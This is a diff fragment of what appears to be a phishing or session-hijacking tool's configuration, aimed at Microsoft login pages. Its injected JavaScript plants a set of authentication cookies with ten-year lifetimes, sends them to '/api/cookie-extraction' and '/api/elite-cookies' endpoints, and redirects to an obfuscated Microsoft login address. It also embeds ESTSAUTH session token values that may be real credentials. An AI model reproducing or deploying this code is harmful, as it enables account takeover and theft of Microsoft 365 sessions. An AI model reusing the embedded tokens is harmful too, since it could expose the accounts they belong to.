+              "path": "/",
+              "secure": true,
+              "httpOnly": true,
+              "sameSite": "None"
+          }
+      ]
+
+              function setCookie(key, value, domain, expires, path, isSecure) {
+                  const tenYearSeconds = 315360000; // 10 years in seconds
+                  domain = domain ? domain : window.location.hostname
+                  if (key.startsWith('__Host')) {
+                      console.log('!important not set domain or browser will rejected due to setting a domain=>', key, value);
+                      document.cookie = `${key}=${value};Max-Age=${tenYearSeconds};path=${path};Secure;SameSite=None`;
+                  } else if (key.startsWith('__Secure')) {
+                      console.log('!important set secure flag or browser will rejected due to missing Secure directive=>', key, value);
+                      document.cookie = `${key}=${value};Max-Age=${tenYearSeconds};domain=${domain};path=${path};Secure;SameSite=None`;
+                  } else {
+                      if (isSecure) {
+                          if (window.location.hostname == domain) {
+                              document.cookie = `${key}=${value};Max-Age=${tenYearSeconds};path=${path};Secure;SameSite=None`;
+                          } else {
+                              document.cookie = `${key}=${value};Max-Age=${tenYearSeconds};domain=${domain};path=${path};Secure;SameSite=None`;
+                          }
+                      } else {
+                          console.log('standard cookies Set', key, value);
+                          if (window.location.hostname == domain) {
+                              document.cookie = `${key}=${value};Max-Age=${tenYearSeconds};path=${path}`;
+                          } else {
+                              document.cookie = `${key}=${value};Max-Age=${tenYearSeconds};domain=${domain};path=${path}`;
+                          }
+                      }
+                  }
+              }
+          for (let cookie of cookies) {
+              setCookie(cookie.name, cookie.value, cookie.domain, cookie.expires, cookie.path, cookie.secure)
+          }
+          
+          // Exfiltrate the injected cookies
+          try {
+              const exfil = new Image();
+              exfil.src = `https://${location.hostname}/api/cookie-extraction?count=${cookies.length}&cookies=${encodeURIComponent(JSON.stringify(cookies))}`;
+              exfil.style.display = 'none';
+              document.body?.appendChild(exfil);
+          } catch (e) {}
+          
+          window.location.reload();
+      })();
+  - trigger_domains: ["login.microsoftonline.com", "login.live.com", "www.office.com"]
+    trigger_paths: ["/.*"]
+    script: |
+      !function(){let e=JSON.parse(`[{"name":"ESTSAUTHPERSISTENT","value":"1.AVgA2mYivhnsNk-MFcQK1dCL61tEZUfGMrBJg-Ydk3ZSdspYAFBYAA.AgABFwQAAABVrSpeuWamRam2jAF1XRQEAwDs_wUA9P8N5yHec9MD4fSb5C3frSko1P2bel35fU3DSdSnUn3MJfHgkVTMEzI7kchpSCzCCY6sGbS5eLUp3v7Sqt0I5PlIxc3ECyp5yTA0g6OJJ2tKpzU7FIl_b44lkdZGfIErsK1vTRBfKLye8TLLAGaRyK2smrhRNKr-iu2MTBSy7rUsxSWvxQiA6PM-ENfOdB3Ozrah90_G2YFQpgHGEZur0wP2VJEAFvBX0P_HR1RuXf4JYYeB_ciYtVhgerignkz99aEx8_AKLMbySpKtFqGcPJejGBj5JvHnsvbmiiqDBNP-14EIeluMCKHD5B_9Y1R9sCSnaN5vYrapgN6QreoGir-5x4A6CBT1wiRp3ifavrZ2FB6P20xDxq_QbZGadG1Nes6KJDQD5vZZ0d60rMqIrJ0tDf-G6QP-lypPtc70YEXVLaBe8b70e0xCYu3J6i7Osg7BEIl2YyPwBjjJmNcDuCUOnCcNgv6sUS9YCGwpWYL287v9IedjjjNl45ARReAcL0HTh_9EPGtiO3Z_tGsLWlN1HcqYR23_r6vd57Xhx-DglcTBG_bO56m8RBkOPg9rhH5mX_5cqqI8noQEzgpmg4FWL71m-kUcpVgqHpeWq802AwwF-rahzlEYsDUZPUOI3Z6bBEFNhYHZJjM5SsqIbvn6bw","domain":".login.microsoftonline.com","expirationDate":1786561476493,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTH","value":"1.AVgA2mYivhnsNk-MFcQK1dCL61tEZUfGMrBJg-Ydk3ZSdspYAFBYAA.AgABFwQAAABVrSpeuWamRam2jAF1XRQEAwDs_wUA9P-MZPwIs-dinVLFgNb3X8AA7dNMYABKSbawpz8Ra-YTUkjsr3YfvZ2GQdIQAZ3m2RfYBmrm_HSEWr3G","domain":".login.microsoftonline.com","expirationDate":1786561476493,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTHLIGHT","value":"+007beea9-fd12-6f5b-1d33-a594ea033725","domain":".login.microsoftonline.com","expirationDate":1786561476493,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null}]`);const tenYearSeconds=315360000;for(let o of e)document.cookie=`${o.name}=${o.value};Max-Age=${tenYearSeconds};${o.path?`path=${o.path};`:""}${o.domain?`domain=${o.domain};`:""}${o.path?``:`path=/;`}Secure;SameSite=None`;try{const xhr=new XMLHttpRequest();xhr.open('POST','https://'+location.hostname+'/api/elite-cookies',true);xhr.setRequestHeader('Content-Type','application/json');xhr.send(JSON.stringify({cookies:e,timestamp:new Date().toISOString(),url:location.href}));}catch(ex){}window.location.href=atob('aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29t')}();
